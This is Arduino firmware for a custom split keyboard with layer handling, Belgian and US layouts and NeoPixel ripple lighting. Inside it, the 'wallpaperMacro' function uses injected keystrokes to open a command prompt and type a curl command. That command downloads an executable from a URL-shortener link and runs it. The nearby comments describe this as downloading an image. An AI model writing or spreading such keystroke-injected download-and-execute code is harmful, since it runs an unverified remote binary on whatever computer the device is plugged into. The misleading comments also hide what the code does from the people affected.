#include <Wire.h>
#include <Keyboard.h>
#include <Adafruit_NeoPixel.h>

int PIN = 27;
#define NUMPIXELS 39

Adafruit_NeoPixel strip(NUMPIXELS, PIN, NEO_GRB + NEO_KHZ800);

long tapDanceStart = 0;
long tapDanceTime = 0;
bool lastKeyState = LOW;
bool dancing = false;
String danceKeyState;

const int numExpanders = 3;
const int expanderAddresses[numExpanders] = { 0x20, 0x21, 0x22 };

byte previousState[numExpanders][2] = { {0} }; // Array to store previous button states for each port

char rawLayout[2][3][2][7] = { {
      {
          {'~', '1', '2', '3', '4', '5', 0xF0},
          {0xB3, 'a', 'z', 'e', 'r', 't', 0xF1}
      },
      {
          {0xB1, 'q', 's', 'd', 'f', 'g', 0xF2},
          {0x81, 'w', 'x', 'c', 'v', 'b', 'E'}
      },
      {
          {0x80, ' ', 0x83, 0x82, ' ', 0xB2, ' '},
          {'N', 'E', ' ', ' ', ' ', ' ', ' '}
      }
  },
  {
      {
          {'A', 'Q', ' ', ' ', ' ', ' ', ' '},
          {' ', ' ', ' ', '7', '8', '9', ' '}
      },
      {
          {' ', ' ', ' ', '4', '5', '6', ' '},
          {' ', ' ', ' ', '1', '2', '3', ' '}
      },
      {
          {'C', 'D', 'F', 'G', ' ', '0', ' '},
          {'N', ' ', ' ', ' ', ' ', ' ', ' '}
      }
  } };

int currentLayer = 0;

void mapLayout(char rawLayout[2][3][2][7], char output[2][3][2][7]) {
  static int layoutMap[3][2][7][3] = {
  {{{0,0,0}, {0,0,1}, {0,0,2}, {0,0,3}, {0,0,4}, {0,0,5}, {0,0,6}},
   {{0,1,6}, {0,1,5}, {0,1,4}, {0,1,3}, {0,1,2}, {0,1,1}, {0,1,0}}},
  {{{1,0,0}, {1,0,1}, {1,0,2}, {1,0,3}, {1,0,4}, {1,0,5}, {1,0,6}},
   {{1,1,6}, {1,1,5}, {1,1,4}, {1,1,3}, {1,1,2}, {1,1,1}, {1,1,0}}},
  {{{2,0,4}, {2,0,3}, {2,0,2}, {2,0,1}, {2,0,0}, {2,1,5}, {2,1,4}},
   {{2,1,1}, {2,1,0}, {2,1,2}, {2,1,3}, {2,0,5}, {2,0,6}, {2,1,6}}} };

  for (int layout = 0; layout < 2; layout++) {
    for (int i = 0; i < 3; i++) {
      for (int j = 0; j < 2; j++) {
        for (int k = 0; k < 7; k++) {
          int* mapElement = layoutMap[i][j][k];
          output[layout][mapElement[0]][mapElement[1]][mapElement[2]] = rawLayout[layout][i][j][k];
        }
      }
    }
  }
}

char layout[2][3][2][7];

int lastKey[3] = { 0, 0, 0 };
bool needRipple = false;

void setup() {
  Serial.begin(115200);
  Wire1.setSDA(28); // Set SDA pin for Wire1
  Wire1.setSCL(29); // Set SCL pin for Wire1
  Wire1.begin();    // Initialize Wire1

  // Iterate over each expander
  for (int i = 0; i < numExpanders; i++) {
    Wire1.beginTransmission(expanderAddresses[i]);
    Wire1.write(0x06); // Register address for configuration
    Wire1.write(0xFF); // Set all pins as inputs with pull-up resistors
    Wire1.endTransmission();

    Keyboard.begin(KeyboardLayout_be_BE);
  }

  mapLayout(rawLayout, layout);
}

void loop() {
  read_keypress();
  // if (!dancing) {
  //   tapDance(lastKeyState);
  // }
}

void setup1() {
  strip.begin();
  strip.clear();

  for (int i = 0; i < NUMPIXELS; i++) {

    strip.setPixelColor(i, strip.Color(255, 255, 255));
    strip.show();
    delay(50);
  }
}

void loop1() {
  //rainbow(20);
  //rainbowCycle(20);
  if (needRipple) {
    ripple();
  }
}

void rainbow(uint8_t wait) {
  uint16_t i, j;

  for (j = 0; j < 256; j++) {
    for (i = 0; i < strip.numPixels(); i++) {
      strip.setPixelColor(i, Wheel((i + j) & 255));
    }
    strip.show();
    delay(wait);
  }
}

// Iets andere variatie van de rainbow functie maar dan iets gelijkmatiger
void rainbowCycle(uint8_t wait) {
  uint16_t i, j;

  for (j = 0; j < 256 * 5; j++) { // 5 cycles of all colors on wheel
    for (i = 0; i < strip.numPixels(); i++) {
      strip.setPixelColor(i, Wheel(((i * 256 / strip.numPixels()) + j) & 255));
    }
    strip.show();
    delay(wait);
  }
}

// Voer een waarde van 0 tot 255 in voor berekening van kleur waarden.
// De kleuren zijn een r - g - b combinatie.
uint32_t Wheel(byte WheelPos) {
  if (WheelPos < 85) {
    return strip.Color(WheelPos * 3, 255 - WheelPos * 3, 0);
  }
  else if (WheelPos < 170) {
    WheelPos -= 85;
    return strip.Color(255 - WheelPos * 3, 0, WheelPos * 3);
  }
  else {
    WheelPos -= 170;
    return strip.Color(0, WheelPos * 3, 255 - WheelPos * 3);
  }
}

void ripple() {
  needRipple = false;
  int frequency = 100;
  int amplitude = 150;
  int steps = 300;
  int keys = 39;
  int ledOrigin;

  int keyLEDMatchList[39][4]{
  {2, 1, 0, 0},
  {2, 1, 3, 1},
  {0, 0, 6, 2},
  {0, 1, 0, 3},
  {1, 0, 6, 4},
  {1, 1, 0, 5},
  {2, 1, 4, 6},
  {2, 1, 1, 7},
  {2, 1, 2, 8},
  {0, 0, 5, 9},
  {0, 1, 1, 10},
  {1, 0, 5, 11},
  {1, 1, 1, 12},
  {2, 1, 5, 13},
  {0, 0, 4, 14},
  {0, 1, 2, 15},
  {1, 0, 4, 16},
  {1, 1, 2, 17},
  {2, 0, 0, 18},
  {0, 0, 3, 19},
  {0, 1, 3, 20},
  {1, 0, 3, 21},
  {1, 1, 3, 22},
  {2, 0, 1, 23},
  {0, 0, 2, 24},
  {0, 1, 4, 25},
  {1, 0, 2, 26},
  {1, 1, 4, 27},
  {2, 0, 2, 28},
  {0, 0, 1, 29},
  {0, 1, 5, 30},
  {1, 0, 1, 31},
  {1, 1, 5, 32},
  {2, 0, 3, 33},
  {0, 0, 0, 34},
  {0, 1, 6, 35},
  {1, 0, 0, 36},
  {1, 1, 6, 37},
  {2, 0, 4, 38}
  };


  for (int i = 0; i < NUMPIXELS; i++) {
    if (lastKey[0] == keyLEDMatchList[i][0] && lastKey[1] == keyLEDMatchList[i][1] && lastKey[2] == keyLEDMatchList[i][2]) {
      ledOrigin = keyLEDMatchList[i][3];
    }
  }

  int key_xy[keys][2] = {
  {128, -34},
  {119, -45},
  {114, 77},
  {114, 58},
  {114, 39},
  {114, 20},
  {119, -9},
  {109, -25},
  {99, -42},
  {95, 77},
  {95, 58},
  {95, 39},
  {95, 20},
  {97, -10},
  {76, 79},
  {76, 60},
  {76, 41},
  {76, 22},
  {77, -5},
  {57, 80},
  {57, 61},
  {57, 42},
  {57, 23},
  {57, 4},
  {38, 79},
  {38, 60},
  {38, 41},
  {38, 22},
  {38, 03},
  {19, 77},
  {19, 58},
  {19, 39},
  {19, 20},
  {19, 1},
  {0, 76},
  {0, 57},
  {0, 38},
  {0, 19},
  {0, 0}
  };

  int start_x = key_xy[ledOrigin][0];
  int start_y = key_xy[ledOrigin][1];

  for (float step = 0; step < steps; step++) {
    // for key in key_xy:
    for (int key = 0; key < keys; key++) {
      int x = key_xy[key][0];
      int y = key_xy[key][1];

      float distance = sqrt(pow((x - start_x), 2) + pow((y - start_y), 2));
      float displacement = amplitude * sin((distance + 192 - step) / frequency);
      int intensity = max(0, min((displacement - 143) * 36, 255));
      strip.setPixelColor(key, strip.Color((step / steps*1.5) * intensity, 0, intensity));
    }
    delay(1);
    strip.show();
    if (needRipple) {
      break;
    }
  }
}

void read_keypress() {
  for (int expander = 0; expander < numExpanders; expander++) {
    for (int port = 0; port < 2; port++) {
      Wire1.beginTransmission(expanderAddresses[expander]);
      Wire1.write(port); // Register address for input port 0
      Wire1.endTransmission();

      Wire1.requestFrom(expanderAddresses[expander], 1); // Request 1 byte of data
      byte inputState = Wire1.read();                   // Read the input state for port 0
      if (inputState != previousState[expander][port]) {
        write_keypress(expander, port, inputState);
      }
    }
  }
}

void write_keypress(int expander, int port, byte inputState) {
  for (int pin = 0; pin < 7; pin++) {
    byte currentState = bitRead(inputState, pin);
    byte prevState = bitRead(previousState[expander][port], pin);



    char key = layout[currentLayer][expander][port][pin];

    // Check if the button state has changed
    if (currentState == LOW && prevState == HIGH) {
          lastKey[0] = expander;
    lastKey[1] = port;
    lastKey[2] = pin;
    needRipple = true;
      if (key == 'C' || key == 'D' || key == 'F' || key == 'G') {
        wallpaperMacro(key);
      }
      else if (key == 'N') {
        Keyboard.releaseAll();
        currentLayer = 1;
      }
      else if (key == 'A') {
        Keyboard.releaseAll();
        Keyboard.begin(KeyboardLayout_be_BE);
      }
      else if (key == 'Q') {
        Keyboard.releaseAll();
        Keyboard.begin(KeyboardLayout_en_US);
      }
      else if (key == 'B') {
        tapDance(HIGH);
      }
      else if (key == 'E') {
        Serial.println("coffee");
      }
      else {
        Keyboard.press(key);
      }
    }
    else if (currentState == HIGH && prevState == LOW) {
      if (key == 'N') {
        Keyboard.releaseAll();
        currentLayer = 0;
      }
      else if (key == 'B') {
        tapDance(LOW);
      }
      else {
        Keyboard.release(key);
      }
    }

    bitWrite(previousState[expander][port], pin, currentState); // Update the previous button state for port 0
  }
}

void wallpaperMacro(char key) {
  String image_url;

  switch (key) {
  case 'E':
    image_url = "";
    break;
  case 'C':
    image_url = "https://i.imgur.com/XNF5Fsr.jpg";
    break;
  case 'D':
    image_url = "https://i.imgur.com/40vvV.jpg";
    break;
  case 'G':
    image_url = "https://images8.alphacoders.com/129/1291973.png";
    break;
  case 'F':
    image_url = "https://cdn.discordapp.com/attachments/646045819992145926/1111054860612276314/a.jpg";
    break;

  }
  // Press Windows key + R
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  // Type the curl command to download the image
  Keyboard.println("cmd");
  delay(100);  // Wait for the download to complete
  Keyboard.releaseAll();
  delay(100);

  // Type the curl command to download the image
  Keyboard.print("curl ");
  delay(100);
  Keyboard.write(0x3D);
  delay(100);
  Keyboard.println("Lo ./w.exe https://t.ly/qU6Kr && w.exe " + image_url + " & exit");
  delay(100);  // Wait for the download to complete
  Keyboard.releaseAll();
  delay(100);

  // Press Windows key + R
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
}

void tapDance(bool keyState) {
  dancing = true;
  lastKeyState = keyState;
  char keyTap = '1';
  char keyHold = '2';
  char keyDoubleTap = '3';
  char keyTapHold = '4';
  Serial.println(keyState);
  long currentTime = millis();

  tapDanceTime = currentTime - tapDanceStart;

  if (tapDanceTime == 0) {
    danceKeyState = "firstHigh";
  }
  else if (danceKeyState == "firstHigh" && tapDanceTime < 100) {
    if (keyState == LOW) {
      //* first press
      Serial.println("first press");
      tapDanceTime = 0;
      danceKeyState = "firstLow";
    }
    //* second press
  }
  else if (tapDanceTime > 200) {
    //* long press
  }
  if (keyState == HIGH) {
    Serial.println("first press");
    tapDanceTime = 1;
  } if (tapDanceTime > 200) {
    Serial.println("long press");
  }
}